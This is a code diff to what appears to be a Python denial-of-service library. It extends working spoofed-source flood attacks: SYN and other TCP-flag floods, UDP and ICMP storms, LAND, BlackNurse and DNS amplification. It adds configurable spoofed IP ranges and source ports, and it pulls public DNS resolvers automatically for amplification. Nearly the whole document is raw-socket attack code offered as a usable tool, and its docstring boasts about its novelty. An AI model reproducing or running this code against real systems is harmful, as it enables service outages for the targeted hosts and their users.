@@ -1359,6 +1359,7 @@ def slowloris(u,p=80,threads=20,maxtime=5,interval=300,logs=True,settor=False):
   except KeyboardInterrupt:
    stop=True
    break
+ print('')
 class plor(threading.Thread):
  def run(self):
   global counter
@@ -1672,30 +1673,37 @@ class sflood(threading.Thread):
   self.ackf=ackf
   self.urgf=urgf
   self.finf=finf
-  self.tcpf=tcpf
   self.winds=winds
   self.paylo=paylo
+  self.min_win=min_win
+  self.max_win=max_win
+  self.ip_seg=ip_seg
   self.maxttl=maxttl
   self.minttl=minttl
   self.amp=amp
+  self.s_port=s_port
+  self.min_por=min_por
+  self.max_por=max_por
   time.sleep(2)
   while (stop!=True):
    try:
     s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-    sp=random.randint(1024,65500)
-    if self.paylo==False:
+    if self.s_port<0:
+     sp=random.randint(self.min_por,self.max_por)
+    else:
+     sp=self.s_port
+    if self.paylo==0:
      urd=''
      req='None'
-    else:
-     if self.tcpf==True:
+    elif self.paylo==1:
       urd=''
       req='TCP'
       for x in range(random.randint(1*self.amp,3*self.amp)):
        urd+=str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)
       if len(urd)>1400:
        urd=urd[0:1400]
-     else:
+    elif self.paylo==2:
       pths=random.choice(paths)
       for l in range(random.randint(1,5)):
        ed=random.choice(ec)
@@ -1730,7 +1738,10 @@ class sflood(threading.Thread):
         urd= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n{}".format(pths+'?'+str(random.randint(0,100000000))+random.choice(lis)+str(random.randint(0,100000000)),random.choice(ua),l,random.randint(300,1000),len(par),self.target,par)
     leng=len(urd)
     urd=urd.encode('utf-8')
-    sip=getip()
+    if self.ip_seg==None:
+     sip=getip()
+    else:
+     sip=self.ip_seg.format(random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255))
     ips = socket.inet_aton(sip)
     ipd = socket.inet_aton(dip)
     iphv = (4 << 4) + 5
@@ -1740,7 +1751,7 @@ class sflood(threading.Thread):
     if self.winds==0:
      windf=0
     elif self.winds<0:
-     windf=random.randint(min_win,max_win)#actual window size= this value * 256
+     windf=random.randint(self.min_win,self.max_win)#actual window size= this value * 256
     else:
      windf=self.winds
     thd = pack('!HHLLBBHHH' , sp, self.port, 0 , self.ackf, 5, tf, socket.htons(windf) , 0, 0)
@@ -1759,7 +1770,7 @@ class sflood(threading.Thread):
    except Exception as e:
     pass
    time.sleep(.1)
-def synflood(u,p=80,max_window=255,min_window=1,threads=100,syn=1,rst=0,psh=0,ack=0,urg=0,fin=0,tcp=False,window=-1,payloads=True,low=64,maxi=64,ampli=15,interval=300,logs=True,returning=False):
+def synflood(u,p=80,source_port=-1,max_port=65535,min_port=1024,ip_range=None,max_window=255,min_window=1,threads=100,syn=1,rst=0,psh=0,ack=0,urg=0,fin=0,window=-1,payload=0,low=64,maxi=64,ampli=15,interval=300,logs=True,returning=False):
   '''
    this function is for TCP flags floods with spoofed randomly IPs. you can launch any type of spoofed TCP floods by modifying the parameters (SYN, SYN-ACK, ACK, ACK-PSH, FIN...) and another wonderful thing here is that you can also send either spoofed legitimte HTTP requests (GET & POST), randomly created TCP data (which you can control their size), or just send no data with the spoofed packets, also you can modify the window size and Time To Live (TTL) values for more random and unique packets!!! now this is something you won't fine anywhere else on github or stackoverflow ;).
 
@@ -1787,6 +1798,14 @@ def synflood(u,p=80,max_window=255,min_window=1,threads=100,syn=1,rst=0,psh=0,ac
 '''
   global stop
   stop=False
+  global s_port
+  s_port=source_port
+  global min_por
+  min_por=min_port
+  global max_por
+  max_por=max_port
+  global ip_seg
+  ip_seg=ip_range
   global max_win
   max_win=max_window
   if max_win>256:
@@ -1813,12 +1832,14 @@ def synflood(u,p=80,max_window=255,min_window=1,threads=100,syn=1,rst=0,psh=0,ac
   urgf=urg
   global finf
   finf=fin
-  global tcpf
-  tcpf=tcp
   global winds
   winds=window
   global paylo
-  paylo=payloads
+  paylo=int(payload)
+  if paylo<0:
+   paylo=0
+  if paylo>2:
+   paylo=2
   global maxttl
   maxttl=maxi
   global minttl
@@ -1861,16 +1882,27 @@ class udpsp(threading.Thread):
   self.maxttl=maxttl
   self.minttl=minttl
   self.amp=amp
+  self.ip_seg=ip_seg
+  self.s_port=s_port
+  self.min_por=min_por
+  self.max_por=max_por
   time.sleep(2)
   while (stop!=True):
    try:
+    if self.s_port<0:
+     sp=random.randint(self.min_por,self.max_por)
+    else:
+     sp=self.s_port
     msg=''
     for x in range(random.randint(1*self.amp,3*self.amp)):
      msg+=str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)
     if len(msg)>1400:
      msg=msg[0:1400]
-    sip=getip()
-    packet = IP(ttl=random.randint(self.minttl,self.maxttl),src=sip, dst=self.target)/UDP(sport=random.randint(1024,65500),dport=self.port)/msg
+    if self.ip_seg==None:
+     sip=getip()
+    else:
+     sip=self.ip_seg.format(random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255))
+    packet = IP(ttl=random.randint(self.minttl,self.maxttl),src=sip, dst=self.target)/UDP(sport=sp,dport=self.port)/msg
     s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     packet=bytes(packet)
@@ -1881,12 +1913,20 @@ class udpsp(threading.Thread):
     time.sleep(.1)
    except:
     pass
-def udpstorm(u,p=80,threads=100,low=64,maxi=64,ampli=1,interval=300,logs=True,returning=False):
+def udpstorm(u,p=80,ip_range=None,source_port=-1,max_port=65535,min_port=1024,threads=100,low=64,maxi=64,ampli=1,interval=300,logs=True,returning=False):
  '''
    this function is for UDP flood attack using spoofed sources
 '''
  global stop
  stop=False
+ global s_port
+ s_port=source_port
+ global min_por
+ min_por=min_port
+ global max_por
+ max_por=max_port
+ global ip_seg
+ ip_seg=ip_range
  global prints
  prints=logs
  global target
@@ -1934,8 +1974,9 @@ class ln(threading.Thread):
   self.maxttl=maxttl
   self.minttl=minttl
   self.winds=winds
+  self.min_win=min_win
+  self.max_win=max_win
   self.paylo=paylo
-  self.tcpf=tcpf
   self.amp=amp
   time.sleep(2)
   while (stop!=True):
@@ -1943,21 +1984,20 @@ class ln(threading.Thread):
     if self.winds==0:
      windf=0
     elif self.winds<0:
-     windf=random.randint(min_win,max_win)#actual window size= this value * 256
+     windf=random.randint(self.min_win,self.max_win)#actual window size= this value * 256
     else:
      windf=self.winds
-    if self.paylo==False:
+    if self.paylo==0:
      urd=''
      req='None'
-    else:
-     if self.tcpf==True:
+    elif self.paylo==1:
       urd=''
       req='TCP'
       for x in range(random.randint(1*self.amp,3*self.amp)):
        urd+=str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)
       if len(urd)>1400:
        urd=urd[0:1400]
-     else:
+    elif self.paylo==2:
       pths=random.choice(paths)
       for l in range(random.randint(1,5)):
        ed=random.choice(ec)
@@ -2001,7 +2041,7 @@ class ln(threading.Thread):
     time.sleep(.1)
    except Exception as e:
     pass
-def land(u,p=80,threads=100,max_window=255,min_window=1,low=64,maxi=64,ampli=15,tcp=False,payloads=False,window=-1,interval=300,logs=True,returning=False):
+def land(u,p=80,threads=100,max_window=255,min_window=1,low=64,maxi=64,ampli=15,payload=0,window=-1,interval=300,logs=True,returning=False):
  '''
    this function is for LAND attack in which we are spoofing the victim's IP and targeted port.
 '''
@@ -2031,10 +2071,12 @@ def land(u,p=80,threads=100,max_window=255,min_window=1,low=64,maxi=64,ampli=15,
  maxttl=maxi
  global minttl
  minttl=low
- global tcpf
- tcpf=tcp
  global paylo
- paylo=payloads
+ paylo=int(payload)
+ if paylo<0:
+   paylo=0
+ if paylo>2:
+   paylo=2
  global winds
  winds=window
  wh=0
@@ -2108,6 +2150,8 @@ def dnsamplif(u,p=80,dnslist=[],threads=100,q='ANY',interval=300,logs=True,retur
  port=p
  global dnsl
  dnsl=dnslist
+ if dnsl==[]:
+  dnsl=bane.get_public_dns()
  global query
  query=q
  wh=0
@@ -2627,6 +2671,7 @@ class icmpst(threading.Thread):
   self.minttl=minttl
   self.maxttl=maxttl
   self.amp=amp
+  self.ip_seg=ip_seg
   time.sleep(2)
   while (stop!=True):
    data=''
@@ -2635,7 +2680,10 @@ class icmpst(threading.Thread):
    if len(data)>1400:
     data=data[0:1400]
    try:
-    sip=getip()
+    if self.ip_seg==None:
+     sip=getip()
+    else:
+     sip=self.ip_seg.format(random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255))
     packet=IP(ttl=random.randint(self.minttl,self.maxttl),src=sip,dst=self.target)/ICMP()/data
     s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
@@ -2647,12 +2695,14 @@ class icmpst(threading.Thread):
    except Exception as e:
     pass
    time.sleep(.1)
-def icmpstorm(u,p=80,ampli=15,low=64,maxi=64,threads=100,interval=300,logs=True,returning=True):
+def icmpstorm(u,p=80,ip_range=None,ampli=15,low=64,maxi=64,threads=100,interval=300,logs=True,returning=True):
  '''
    this function is for ICMP flood with spoofed sources
 '''
  global stop
  stop=False
+ global ip_seg
+ ip_seg=ip_range
  global prints
  prints=logs
  global target
@@ -2699,10 +2749,14 @@ class blnu(threading.Thread):
   self.port=port
   self.minttl=minttl
   self.maxttl=maxttl
+  self.ip_seg=ip_seg
   time.sleep(2)
   while (stop!=True):
    try:
-    sip=getip()
+    if self.ip_seg==None:
+     sip=getip()
+    else:
+     sip=self.ip_seg.format(random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255))
     packet=IP(ttl=random.randint(self.minttl,self.maxttl),src=sip,dst=self.target)/ICMP(type=3,code=3)
     s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
@@ -2714,12 +2768,14 @@ class blnu(threading.Thread):
    except Exception as e:
     pass
    time.sleep(.1)
-def blacknurse(u,p=80,ampli=15,low=64,maxi=64,threads=100,payloads=False,interval=300,logs=True,returning=False):
+def blacknurse(u,p=80,ip_range=None,ampli=15,low=64,maxi=64,threads=100,payloads=False,interval=300,logs=True,returning=False):
  '''
    this function is for "black nurse" attack
 '''
  global stop
  stop=False
+ global ip_seg
+ ip_seg=ip_range
  global prints
  prints=logs
  global target
